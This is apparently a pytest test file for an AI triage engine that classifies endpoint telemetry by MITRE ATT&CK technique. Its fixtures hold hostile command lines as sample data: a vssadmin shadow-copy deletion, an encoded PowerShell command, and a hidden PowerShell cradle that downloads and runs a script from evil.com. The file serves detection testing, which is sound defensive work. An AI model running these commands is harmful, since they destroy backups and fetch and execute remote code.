"""
Tests for Phase 2 Central AI Triage Engine & MITRE ATT&CK Classification
"""
import pytest
from backend.agents.ai_triage import AITriageEngine

def test_triage_benign_telemetry():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-1", "hostname": "WORKSTATION-01"},
        "flagged_processes": [],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["risk_score"] == 0
    assert res["risk_level"] == "LOW"
    assert res["category"] == "BENIGN_ACTIVITY"
    assert res["false_positive_probability"] > 0.8

def test_triage_ransomware_shadow_deletion():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-2", "hostname": "FINANCE-PC"},
        "flagged_processes": [
            {
                "pid": 4012,
                "name": "vssadmin.exe",
                "exe": "C:\\Windows\\System32\\vssadmin.exe",
                "cmdline": "vssadmin.exe Delete Shadows /All /Quiet",
                "is_flagged": True
            }
        ],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["risk_score"] >= 90
    assert res["risk_level"] == "CRITICAL"
    assert res["matched_rules_count"] >= 1
    assert res["matched_rules"][0]["technique_id"] == "T1490"

def test_triage_obfuscated_powershell():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-3", "hostname": "DEV-LAPTOP"},
        "flagged_processes": [
            {
                "pid": 5510,
                "name": "powershell.exe",
                "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA...",
                "is_flagged": True
            }
        ],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["risk_score"] >= 75
    assert res["risk_level"] in ("HIGH", "CRITICAL")
    assert res["matched_rules"][0]["technique_id"] == "T1059"

def test_triage_macro_phishing_spawning():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-4", "hostname": "HR-DESK"},
        "flagged_processes": [
            {
                "pid": 8812,
                "name": "powershell.exe",
                "exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "cmdline": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
                "is_flagged": True
            }
        ],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["risk_score"] >= 85
    assert res["risk_level"] == "CRITICAL"
